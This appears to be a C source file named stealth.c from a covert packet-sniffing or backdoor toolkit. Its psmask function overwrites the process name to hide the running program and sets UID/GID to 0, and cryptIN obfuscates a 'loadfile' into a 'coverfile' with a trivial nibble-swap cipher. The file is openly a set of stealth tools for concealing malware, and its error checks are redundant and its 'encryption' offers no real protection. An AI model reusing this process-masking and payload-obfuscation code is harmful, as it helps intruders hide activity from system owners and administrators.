/*****************
*
* stealth.c
*       a suite of stealth tools
*
******************/

#include "pkt_sniff.h"

void psmask(char *prog){
	/* mask the process name */
	memset(prog, 0, strlen(prog));
	strcpy(prog, MASK);
	prctl(PR_SET_NAME, MASK, 0, 0);

	/* change the UID/GID to 0 (raise privs) */
	setuid(0);
	setgid(0);
}

// reuse the old swapIN 'encryption' function
unsigned char swapIN(unsigned char x){
    // my cheap form of encryption
     return ( (~x & 0x0F)<<4 | (~x & 0xF0)>>4 );
}

int cryptIN(char *infile, char * outfile){

    //    printf("Decoding using... %s password\n", pass);

    FILE * ifp, *ofp;
    int maxSz=0, fsz = 0,i;
    char inbuf[BUFFSIZE],outbuf[BUFFSIZE];
    size_t bytes;

    ifp = fopen(infile,"rb");
    if (!ifp){
        printf("File does not exist - %s", infile);
        return -1;
    } else if (ifp==0){
        printf("Could not open - %s", infile);
        return 0;
    } else if (ifp== NULL){
        printf("Could not create - %s", infile);
     } else{
    //        printf("Created - %s\n", infile);
    }

    ofp = fopen(outfile,"wb");
    if (!ofp){
        printf("File does not exist - %s", outfile);
        return -1;
    } else if (ofp==0){
        printf("Could not open - %s", outfile);
        return 0;
    } else if (ofp== NULL){
        printf("Could not create - %s", outfile);
    }else {
    //       printf("Created - %s\n", outfile);
    }

    while ((bytes = fread(inbuf, 1, BUFFSIZE, ifp)) != 0) {
        for(i=0;i<bytes;i++){
            outbuf[i]=swapIN(inbuf[i]);
        }

        if(fwrite(outbuf, 1, bytes, ofp) != bytes) {
            return 1;                                           // or other action
        }
    }


    // close loadfile
    fclose(ifp);

    // close coverfile
    fclose(ofp);

    // success
    return 1;
}
